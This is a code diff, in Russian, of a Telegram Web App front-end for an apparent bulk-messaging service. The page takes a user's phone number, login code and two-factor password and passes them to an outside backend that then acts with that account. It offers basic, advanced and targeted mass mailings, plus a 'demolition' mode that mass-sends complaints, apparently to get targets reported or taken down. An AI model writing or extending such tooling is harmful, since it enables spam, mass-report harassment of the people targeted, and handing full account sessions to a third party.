-        if (response.success) {
-            showManageStatus('success', response.message || 'Рассылка успешно запущена');
-            document.getElementById('message-text').value = '';
-            document.getElementById('target-chat').value = '';
-        } else {
-            if (response.requires_subscription) {
-                showManageStatus('subscription', response.message || 'Требуется подписка');
-            } else if (response.requires_premium) {
-                showManageStatus('premium', response.message || 'Требуется премиум подписка');
-            } else {
-                showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось создать рассылку'));
+        if (tg) {
+            tg.expand();
+            try {
+                tg.enableClosingConfirmation();
+            } catch (e) {
+                console.log('Closing confirmation not supported');
             }
         }
-        
-    } catch (error) {
-        console.error('Error creating mailing:', error);
-        showManageStatus('error', 'Ошибка создания рассылки');
-    }
-}
 
-async function startDemolition() {
-    const messageText = document.getElementById('demolition-text').value.trim();
-    
-    if (!messageText) {
-        showManageStatus('error', 'Введите текст жалобы');
-        return;
-    }
-    
-    showManageStatus('loading', 'Запускаем отправку жалоб...');
-    
-    try {
-        const response = await fetchWithTelegramAuth('/user/demolition', {
-            method: 'POST',
-            body: JSON.stringify({
-                user_id: currentUserId,
-                message_text: messageText
-            })
-        });
-        
-        if (response.success) {
-            showManageStatus('success', response.message || 'Жалобы успешно отправлены!');
-            document.getElementById('demolition-text').value = '';
-        } else {
-            if (response.requires_premium) {
-                showManageStatus('premium', response.message || 'Требуется премиум подписка');
-            } else {
-                showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить жалобы'));
+        // Конфигурация
+        const BACKEND_URL = 'https://rassilka-ilag.amvera.io';
+        const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
+
+        // Глобальные переменные
+        let userConnected = false;
+        let currentUserId = tg?.initDataUnsafe?.user?.id || 'webapp_user';
+        let selectedMethod = 'basic';
+
+        // Основные функции
+        function switchTab(tabName) {
+            // Скрыть все вкладки
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Убрать активный класс со всех вкладок навигации
+            document.querySelectorAll('.nav-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Показать выбранную вкладку
+            document.getElementById(tabName + '-tab').classList.add('active');
+            
+            // Активировать соответствующую кнопку навигации
+            document.querySelector(`.nav-tab[data-tab="${tabName}"]`).classList.add('active');
+        }
+
+        function selectMethod(method) {
+            selectedMethod = method;
+            
+            // Сбросить выделение всех методов
+            document.querySelectorAll('.method-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            // Выделить выбранный метод
+            const methodElement = document.querySelector(`.method-option[data-method="${method}"]`);
+            if (methodElement) {
+                methodElement.classList.add('selected');
+            }
+            
+            // Показать/скрыть соответствующие поля
+            const attemptsGroup = document.getElementById('attempts-group');
+            const targetChatGroup = document.getElementById('target-chat-group');
+            const demolitionGroup = document.getElementById('demolition-group');
+            const createButton = document.getElementById('create-mailing-btn');
+            
+            if (attemptsGroup && targetChatGroup && demolitionGroup && createButton) {
+                switch(method) {
+                    case 'targeted':
+                        attemptsGroup.style.display = 'none';
+                        targetChatGroup.style.display = 'block';
+                        demolitionGroup.style.display = 'none';
+                        createButton.textContent = 'Запустить таргетированную рассылку';
+                        break;
+                    case 'demolition':
+                        attemptsGroup.style.display = 'none';
+                        targetChatGroup.style.display = 'none';
+                        demolitionGroup.style.display = 'block';
+                        createButton.textContent = '🧨 Запустить отправку жалоб';
+                        break;
+                    case 'advanced':
+                        attemptsGroup.style.display = 'block';
+                        targetChatGroup.style.display = 'none';
+                        demolitionGroup.style.display = 'none';
+                        createButton.textContent = 'Запустить продвинутую рассылку';
+                        break;
+                    default: // basic
+                        attemptsGroup.style.display = 'block';
+                        targetChatGroup.style.display = 'none';
+                        demolitionGroup.style.display = 'none';
+                        createButton.textContent = 'Запустить базовую рассылку';
+                }
             }
         }
-        
-    } catch (error) {
-        console.error('Error starting demolition:', error);
-        showManageStatus('error', 'Ошибка отправки жалоб');
-    }
-}
 
-function displayUserInfo(userInfo, scanResult) {
-    const userInfoElement = document.getElementById('userInfo');
-    if (userInfoElement) {
-        userInfoElement.style.display = 'block';
-        document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
-        document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
-        document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
-        document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
-    }
-}
+        async function requestCode() {
+            const phoneNumber = document.getElementById('phone-number').value.trim();
+            
+            if (!phoneNumber) {
+                showStatus('error', 'Введите номер телефона');
+                return;
+            }
+            
+            showStatus('loading', 'Отправляем код подтверждения...');
+            
+            try {
+                const response = await fetchWithTelegramAuth('/auth/request-code', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        phone_number: phoneNumber,
+                        user_id: currentUserId
+                    })
+                });
+                
+                if (response.success) {
+                    showStatus('success', 'Код отправлен! Проверьте Telegram.');
+                    document.getElementById('code-step').style.display = 'block';
+                } else {
+                    showStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить код'));
+                }
+                
+            } catch (error) {
+                console.error('Error requesting code:', error);
+                showStatus('error', 'Ошибка отправки кода');
+            }
+        }
 
-function showStatus(type, message) {
-    const statusEl = document.getElementById('status');
-    if (statusEl) {
-        statusEl.textContent = message;
-        statusEl.className = 'status ' + type;
-    }
-}
+        async function verifyCode() {
+            const code = document.getElementById('verification-code').value.trim();
+            
+            if (!code) {
+                showStatus('error', 'Введите код подтверждения');
+                return;
+            }
+            
+            showStatus('loading', 'Проверяем код...');
+            
+            try {
+                const response = await fetchWithTelegramAuth('/auth/sign-in', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        code: code,
+                        user_id: currentUserId
+                    })
+                });
+                
+                if (response.success) {
+                    if (response.need_password) {
+                        showStatus('success', 'Требуется пароль двухфакторной аутентификации');
+                        document.getElementById('password-step').style.display = 'block';
+                        document.getElementById('code-step').style.display = 'none';
+                    } else {
+                        showStatus('success', 'Сессия успешно подключена!');
+                        userConnected = true;
+                        displayUserInfo(response.user_info, response.scan_result);
+                        setTimeout(() => switchTab('manage'), 1500);
+                    }
+                } else {
+                    showStatus('error', 'Ошибка: ' + (response.message || 'Неверный код'));
+                }
+                
+            } catch (error) {
+                console.error('Error verifying code:', error);
+                showStatus('error', 'Ошибка проверки кода');
+            }
+        }
 
-function showManageStatus(type, message) {
-    const statusEl = document.getElementById('manage-status');
-    if (statusEl) {
-        statusEl.textContent = message;
-        statusEl.className = 'status ' + type;
-    }
-}
+        async function verifyPassword() {
+            const password = document.getElementById('password').value;
+            
+            if (!password) {
+                showStatus('error', 'Введите пароль');
+                return;
+            }
+            
+            showStatus('loading', 'Проверяем пароль...');
+            
+            try {
+                const response = await fetchWithTelegramAuth('/auth/sign-in-password', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        password: password,
+                        user_id: currentUserId
+                    })
+                });
+                
+                if (response.success) {
+                    showStatus('success', 'Сессия успешно подключена!');
+                    userConnected = true;
+                    displayUserInfo(response.user_info, response.scan_result);
+                    setTimeout(() => switchTab('manage'), 1500);
+                } else {
+                    showStatus('error', 'Ошибка: ' + (response.message || 'Неверный пароль'));
+                }
+                
+            } catch (error) {
+                console.error('Error verifying password:', error);
+                showStatus('error', 'Ошибка проверки пароля');
+            }
+        }
 
-// Инициализация
-document.addEventListener('DOMContentLoaded', function() {
-    tg.ready();
-    selectMethod('basic');
-});
+        async function createMailing() {
+            const messageText = document.getElementById('message-text').value.trim();
+            const attempts = parseInt(document.getElementById('attempts').value);
+            const targetChat = document.getElementById('target-chat').value.trim();
+            
+            if (!userConnected) {
+                showManageStatus('error', 'Сначала подключите сессию');
+                return;
+            }
+            
+            if (!messageText) {
+                showManageStatus('error', 'Введите текст сообщения');
+                return;
+            }
+            
+            if ((selectedMethod === 'basic' || selectedMethod === 'advanced') && (attempts < 1 || attempts > 100)) {
+                showManageStatus('error', 'Количество попыток должно быть от 1 до 100');
+                return;
+            }
+            
+            if (selectedMethod === 'targeted' && !targetChat) {
+                showManageStatus('error', 'Введите ID или username целевого чата');
+                return;
+            }
+            
+            showManageStatus('loading', 'Создаем рассылку...');
+            
+            try {
+                const response = await fetchWithTelegramAuth('/user/create-mailing', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        user_id: currentUserId,
+                        message_text: messageText,
+                        attempts: attempts,
+                        mailing_type: selectedMethod,
+                        target_chat: targetChat
+                    })
+                });
+                
+                if (response.success) {
+                    showManageStatus('success', response.message || 'Рассылка успешно запущена');
+                    document.getElementById('message-text').value = '';
+                    document.getElementById('target-chat').value = '';
+                } else {
+                    if (response.requires_subscription) {
+                        showManageStatus('subscription', response.message || 'Требуется подписка');
+                    } else if (response.requires_premium) {
+                        showManageStatus('premium', response.message || 'Требуется премиум подписка');
+                    } else {
+                        showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось создать рассылку'));
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Error creating mailing:', error);
+                showManageStatus('error', 'Ошибка создания рассылки');
+            }
+        }
 
-// Простая проверка подключения
-async function checkConnectionStatus() {
-    try {
-        userConnected = false;
-        console.log('Connection check completed');
-    } catch (error) {
-        console.log('Connection check failed');
-        userConnected = false;
-    }
-}
+        async function startDemolition() {
+            const messageText = document.getElementById('demolition-text').value.trim();
+            
+            if (!messageText) {
+                showManageStatus('error', 'Введите текст жалобы');
+                return;
+            }
+            
+            showManageStatus('loading', 'Запускаем отправку жалоб...');
+            
+            try {
+                const response = await fetchWithTelegramAuth('/user/demolition', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        user_id: currentUserId,
+                        message_text: messageText
+                    })
+                });
+                
+                if (response.success) {
+                    showManageStatus('success', response.message || 'Жалобы успешно отправлены!');
+                    document.getElementById('demolition-text').value = '';
+                } else {
+                    if (response.requires_premium) {
+                        showManageStatus('premium', response.message || 'Требуется премиум подписка');
+                    } else {
+                        showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить жалобы'));
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Error starting demolition:', error);
+                showManageStatus('error', 'Ошибка отправки жалоб');
+            }
+        }
 
-// Запускаем проверку при загрузке
-checkConnectionStatus();
+        function handleMailingAction() {
+            if (selectedMethod === 'demolition') {
+                startDemolition();
+            } else {
+                createMailing();
+            }
+        }
+
+        // Вспомогательные функции
+        async function fetchWithTelegramAuth(url, options = {}) {
+            const finalUrl = `${BACKEND_URL}${url}`;
+            
+            const config = {
+                ...options,
+                headers: {
+                    'Content-Type': 'application/json',
+                    ...options.headers
+                }
+            };
+            
+            try {
+                const response = await fetch(finalUrl, config);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Fetch error:', error);
+                throw error;
+            }
+        }
+
+        function displayUserInfo(userInfo, scanResult) {
+            const userInfoElement = document.getElementById('userInfo');
+            if (userInfoElement) {
+                userInfoElement.style.display = 'block';
+                document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
+                document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
+                document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
+                document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
+            }
+        }
+
+        function showStatus(type, message) {
+            const statusEl = document.getElementById('status');
+            if (statusEl) {
+                statusEl.textContent = message;
+                statusEl.className = 'status ' + type;
+            }
+        }
+
+        function showManageStatus(type, message) {
+            const statusEl = document.getElementById('manage-status');
+            if (statusEl) {
+                statusEl.textContent = message;
+                statusEl.className = 'status ' + type;
+            }
+        }
+
+        async function checkConnectionStatus() {
+            try {
+                userConnected = false;
+                console.log('Connection check completed');
+            } catch (error) {
+                console.log('Connection check failed');
+                userConnected = false;
+            }
+        }
+
+        // Инициализация при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            // Инициализация Telegram Web App
+            if (tg) {
+                tg.ready();
+            }
+            
+            // Настройка обработчиков событий для навигации
+            document.querySelectorAll('.nav-tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabName = this.getAttribute('data-tab');
+                    switchTab(tabName);
+                });
+            });
+            
+            // Настройка обработчиков для выбора методов
+            document.querySelectorAll('.method-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const method = this.getAttribute('data-method');
+                    selectMethod(method);
+                });
+            });
+            
+            // Настройка обработчиков для кнопок
+            document.getElementById('request-code-btn').addEventListener('click', requestCode);
+            document.getElementById('verify-code-btn').addEventListener('click', verifyCode);
+            document.getElementById('verify-password-btn').addEventListener('click', verifyPassword);
+            document.getElementById('create-mailing-btn').addEventListener('click', handleMailingAction);
+            
+            // Инициализация начального состояния
+            selectMethod('basic');
+            checkConnectionStatus();
+        });
+    </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
